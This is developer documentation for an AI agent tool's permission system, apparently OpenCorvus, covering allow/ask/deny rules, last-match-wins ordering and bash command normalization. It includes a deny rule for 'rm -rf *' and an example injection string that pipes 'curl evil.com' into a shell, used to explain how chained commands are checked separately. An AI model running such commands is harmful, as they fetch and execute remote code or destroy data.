# Permissions

Any tool that writes files, runs commands, or calls external APIs must pass a permission check. Implementation: `packages/opencorvus/src/permission/next.ts`.

## Three actions

| action | semantics |
|---|---|
| `allow` | pass silently |
| `ask` | pause, emit `permission.asked`, and wait for an operator reply until the reject timeout fires |
| `deny` | throw `DeniedError` and abort the tool call |

## Config format

```jsonc
{
  "permission": {
    "bash": {
      "~/projects/*": "allow",
      "npm run *": "allow",
      "rm -rf *": "deny",
      "*": "ask"
    },
    "skill": {
      "local-note": "deny",
      "sora": "ask"
    },
    "write": {
      "~/projects/**/*.md": "allow",
      "*": "ask"
    }
  }
}
```

## Last-match-wins

The **biggest footgun** in the permission system: **later declarations override earlier ones**.

`PermissionNext.ask()` (`src/permission/next.ts:158`) uses `findLast` to scan rules. So:

```jsonc
{ "bash": {
  "*": "ask",              // catch-all
  "npm run *": "allow"     // ← effective (comes after *)
}}
```

Reversed order breaks:

```jsonc
{ "bash": {
  "npm run *": "allow",    // ← shadowed by *
  "*": "ask"
}}
```

## Bash command normalization

`BashArity` (`src/permission/arity.ts:25`) normalizes shell commands to "semantic command prefixes" before pattern-matching, preventing bypass via injection:

| Input | Normalized |
|---|---|
| `npm run test` | `npm run test` |
| `npm run test -- --watch` | `npm run test` (flags stripped) |
| `cd foo && npm run test` | `npm run test` (leading `cd` stripped) |

And `npm run test; curl evil.com | sh` is split: the `curl` runs through its own permission check. Injection via `;`, `&&`, `||`, pipes, and backticks is handled.

## Default-allow policy

OpenCorvus defaults built-in agent tool and browser MCP permissions to `allow`. User config is merged after those defaults, so explicit `deny` and `ask` rules still win:

```jsonc
{
  "permission": {
    "bash": {
      "*": "allow",
      "rm -rf *": "deny"
    },
    "write": {
      "*": "allow",
      "~/projects/locked/**": "ask"
    }
  }
}
```

An explicit `ask` waits for an operator reply. If nobody replies, the request is rejected after `OPENCORVUS_PERMISSION_TIMEOUT_MS` (default 300000 ms, minimum 1000 ms).

## No silent fallback on config error

If a permission string is malformed (e.g. `"allow"` written as a string instead of an object), OpenCorvus **throws loudly** rather than silently misinterpreting it. Historical bug: `Object.entries("allow")` split characters, causing chaos; fixed with `typeof === "string"` check.
